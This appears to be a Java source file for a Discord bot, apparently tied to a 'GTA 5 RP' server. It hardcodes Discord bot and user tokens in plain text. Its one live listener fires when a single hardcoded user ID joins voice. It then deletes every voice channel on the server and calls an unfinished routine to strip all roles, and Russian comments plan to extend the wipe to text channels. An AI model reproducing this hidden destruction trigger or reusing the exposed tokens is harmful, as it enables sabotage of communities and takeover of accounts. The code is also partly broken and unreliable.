package bot.start;

import org.javacord.api.DiscordApi;
import org.javacord.api.DiscordApiBuilder;
import org.javacord.api.entity.channel.ServerChannel;
import org.javacord.api.entity.permission.Role;
import org.javacord.api.event.channel.server.voice.ServerVoiceChannelMemberJoinEvent;
import org.javacord.api.event.message.MessageCreateEvent;

import java.util.List;


public class Main {

    private static final Long MY_ID = 544874438936625153L;

//    private static final String GTA_5_RP_BOT_TOKEN  = "MzE3Njk1MTgwMjQ3NDAwNDQ5.XdPv7g.EWokWBVz5yYtwRiey8moyNWjjRU";
    private static final String GTA_5_RP_BOT_TOKEN  = "MzE3Njk1MTgwMjQ3NDAwNDQ5.Xi9lOg.ikmOHsfd3KgFACP9zMxd8r7cJkM";
    private static final String MY_TOKEN = "NjM3OTUzNTY1OTgxNDA5Mjgw.XdqDDA.ciWwQDMMFqFmBQwVKNcgxQxHECk";

    public static void main(String[] args) {

        if (args.length > 0) {
            System.out.println("ARG 0: " + args[0]);
        }

        DiscordApi api = new DiscordApiBuilder().setToken(GTA_5_RP_BOT_TOKEN).login().join();

//        api.addMessageCreateListener(Main::messageListener);
        api.addServerVoiceChannelMemberJoinListener(Main::memberJoinVoice);
    }

    private static void memberJoinVoice(ServerVoiceChannelMemberJoinEvent event) {

        if (event.getUser().getId() == MY_ID) {

             removeAllRoles(event.getServer().getRoles());

            for (ServerChannel item : event.getServer().getChannels()) {
                if (item.getType().toString() == "SERVER_VOICE_CHANNEL") {
                    item.delete();
                }
                // обработка текстовых сообщений.
                // исключение - МОЙ канал и скриншоты!
            }
        }
    }

    private static void removeAllRoles(List<Role> roles) {
//        Long roleBot =
//        if () {
//
//        }

    }

    private static void messageListener(MessageCreateEvent event) {
    }
}
